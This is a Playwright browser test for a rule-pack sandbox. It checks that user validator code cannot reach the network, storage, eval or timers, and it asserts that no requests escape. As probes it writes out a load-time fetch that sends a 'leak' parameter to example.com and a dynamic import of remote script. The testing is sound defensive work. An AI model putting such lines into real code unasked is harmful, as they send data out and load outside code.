// Rule pack sandbox in a real browser: start `npm run dev`, then run this with Playwright installed.
// PLAYWRIGHT_MODULE can point to an existing Playwright module; CHROME_EXECUTABLE_PATH
// can select an existing browser.
import assert from 'node:assert/strict';

const { chromium } = await import(process.env.PLAYWRIGHT_MODULE || 'playwright');
const browser = await chromium.launch({
  headless: true,
  executablePath: process.env.CHROME_EXECUTABLE_PATH || undefined,
});
try {
  const page = await browser.newPage();
  const requests = [];
  page.on('request', request => {
    // The probes only try to reach example.com; the app itself loads OCR assets from a CDN
    if (new URL(request.url()).hostname === 'example.com') requests.push(request.url());
  });
  await page.goto(process.env.TEST_BASE_URL || 'http://127.0.0.1:5173');

  const results = await page.evaluate(async () => {
    const { WorkerScriptHost } = await import('/src/lib/rules/sandbox.ts');
    const call = validator => ({ validator, match: 'secret', groups: [], before: '', after: '' });
    const run = async (validators, names) => {
      const host = new WorkerScriptHost();
      try {
        return await host.validate({ id: 'probe', name: 'Probe', rules: [], validators }, names.map(call));
      } catch (error) {
        return String(error);
      } finally {
        host.dispose();
      }
    };

    // Each probe returns true when the escape route is closed
    const probes = {
      works: '(match) => match === "secret"',
      noFetch: '() => typeof fetch === "undefined"',
      noXhr: '() => typeof XMLHttpRequest === "undefined"',
      noWebSocket: '() => typeof WebSocket === "undefined"',
      noImportScripts: '() => typeof importScripts === "undefined"',
      noNestedWorker: '() => typeof Worker === "undefined"',
      noStorage: '() => typeof indexedDB === "undefined" && typeof caches === "undefined"',
      noFontFace: '() => typeof FontFace === "undefined"',
      noTimers: '() => typeof setTimeout === "undefined" && typeof setInterval === "undefined"',
      noEval: '() => typeof eval === "undefined" && typeof Function === "undefined"',
      noFunctionConstructor: '() => [function () {}, async function () {}, function* () {}, () => {}, [].map]' +
        '.every(fn => fn.constructor === undefined)',
      noPrototypeFetch: '() => { for (let o = self; o; o = Object.getPrototypeOf(o)) if (o.fetch) return false; return true; }',
      noNavigator: '() => typeof navigator === "undefined"',
      noPostMessageReach: '() => typeof postMessage === "undefined"',
    };
    const probeResults = await run(probes, Object.keys(probes));

    // Code that tries to fetch at load time can't
    const loadTimeFetch = await run({
      v: '(() => { try { fetch("https://example.com/?leak=1"); } catch {} return () => true; })()',
    }, ['v']);

    const syntaxError = await run({ v: '() => {' }, ['v']);
    const infiniteLoop = await run({ v: '() => { for (;;) {} }' }, ['v']);
    const thrown = await run({ v: '() => { throw new Error("bug"); }' }, ['v']);
    const imported = await run({ v: '() => import("https://example.com/x.js")' }, ['v']);

    // The whole path: an installed pack with code, run by the detector
    const { parseRulePack, testRulePack } = await import('/src/lib/rules/parse.ts');
    const { installRulePack, removeRulePack } = await import('/src/lib/rules/store.ts');
    const { RegexDetector } = await import('/src/lib/detectors/RegexDetector.ts');
    const pack = parseRulePack(JSON.stringify({
      id: 'browser-test',
      name: 'Browser test',
      rules: [{ id: 'ticket', name: 'Ticket', pattern: 'TKT-(\\d{4})', validator: 'even', examples: ['TKT-1234'], counterExamples: ['TKT-1235'] }],
      validators: { even: '(match, ctx) => Number(ctx.groups[0]) % 2 === 0' },
    }));
    const host = new WorkerScriptHost();
    const selfTest = await testRulePack(pack, host);
    host.dispose();
    installRulePack(pack);
    const entities = await new RegexDetector().detectEntities('Tickets TKT-1234 and TKT-1235');
    removeRulePack('browser-test');
    const tickets = entities.filter(entity => entity.ruleName === 'Ticket').map(entity => [entity.text, entity.detectionMethod]);

    return { probeResults, probeNames: Object.keys(probes), loadTimeFetch, syntaxError, infiniteLoop, thrown, imported, selfTest, tickets };
  });

  results.probeNames.forEach((name, i) => assert.equal(results.probeResults[i], true, `sandbox probe ${name}`));
  assert.deepEqual(results.loadTimeFetch, [true]);
  assert.match(results.syntaxError, /Error/);
  assert.match(results.infiniteLoop, /timed out/);
  assert.deepEqual(results.thrown, [null]);
  assert.match(results.imported, /may not use "import"/);
  assert.deepEqual(results.selfTest, []);
  assert.deepEqual(results.tickets, [['TKT-1234', 'custom']]);
  assert.deepEqual(requests, [], 'pack code made no requests');
  console.log(`Rule pack sandbox passed (${results.probeNames.length} probes)`);
} finally {
  await browser.close();
}
